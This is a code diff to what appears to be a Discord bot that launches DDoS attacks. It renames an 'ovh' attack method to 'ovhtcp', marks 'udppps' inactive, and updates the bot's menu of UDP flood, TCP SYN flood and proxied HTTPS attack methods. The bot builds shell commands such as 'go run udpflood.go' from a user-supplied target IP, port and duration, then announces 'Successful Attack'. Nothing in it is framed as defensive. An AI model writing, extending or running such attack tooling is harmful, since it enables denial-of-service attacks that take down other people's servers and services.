@@ -110,9 +110,9 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         comando = f'go run udpflood.go {ip} {port_int} {tiempo_int}'
         await ctx.send(f'Successful Attack UDPFlood TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
 
-    elif metodo == 'ovh':
+    elif metodo == 'ovhtcp':
         comando = f'sudo ./ovh {ip} {port_int} 20 -1 {tiempo_int}'
-        await ctx.send(f'Successful Attack OVH TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+        await ctx.send(f'Successful Attack OVHTCP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
 
     elif metodo == 'udppayload':
         if payload is None or payload == "null":
@@ -167,7 +167,7 @@ async def show_methods(ctx):
 Methods L4 UDP Protocol:
 • udp
 • udphex
-• udppps
+• udppps (Method Inactive)
 • udpflood
 • udppayload
 • udpbypass
@@ -176,7 +176,7 @@ Methods L4 UDP Protocol:
 Methods L4 TCP Protocol:
 • tcp
 • tcp-syn (Multi-threaded)
-• ovh
+• ovhtcp
 
 Methods L7:
 • https-request (proxy)
